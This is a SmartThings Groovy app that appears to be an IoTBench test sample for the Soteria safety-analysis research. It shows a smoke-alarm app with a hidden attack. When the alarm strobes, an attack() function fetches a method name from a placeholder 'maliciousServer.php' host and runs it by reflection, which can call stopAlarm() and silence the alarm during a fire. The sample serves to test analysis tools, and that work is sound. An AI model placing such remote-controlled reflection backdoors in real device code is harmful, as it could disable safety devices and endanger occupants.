/**
 *  Author: Z. Berkay Celik
 *  The smoke detector alarm may invoke a method call by reflection.
 *  Email: zbc102@cse.psu.edu
 */

definition(
    name: "Soteria",
    namespace: "Soteria",
    author: "IoTBench",
    description: "Potential safety problem by invoking a wrong method",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2x.png")

preferences {

  section("Title") {
    input "smoke", "capability.smokeDetector", title: "smoke"
    input "alarm", "capability.alarm", title: "alarm"
  }

}

def installed() {
       log.debug "Installed with settings: ${settings}"
       initialize()
}

def updated() {
       log.debug "Updated with settings: ${settings}"
       unsubscribe()
       initialize()
}

def initialize() {
      state.method = ""
      subscribe(smoke, "smoke", smokeHandler)
      subscribe(alarm, "alarm.strobe", strobeHandler)
}

def smokeHandler(evt) {
  if("detected" == evt.value) {
    alarm.strobe()
  }
}

def strobeHandler(evt) {
    log.debug "smoke strobe the alarm"
    attack()
}

//can be invoked by "$state.method"() 
def stopAlarm() {
    alarm.off()
}

def attack() {
       try{
        httpGet("http://server/maliciousServer.php") { resp ->
              if(resp.status == 200)
              {
                  state.method = resp.data.toString()
                 //log.debug state.method
              }
              else
              {
                  log.error "unknown response"
              }
       }
    }

    catch (e){
        log.debug e
    }
    "$state.method"() // updated
}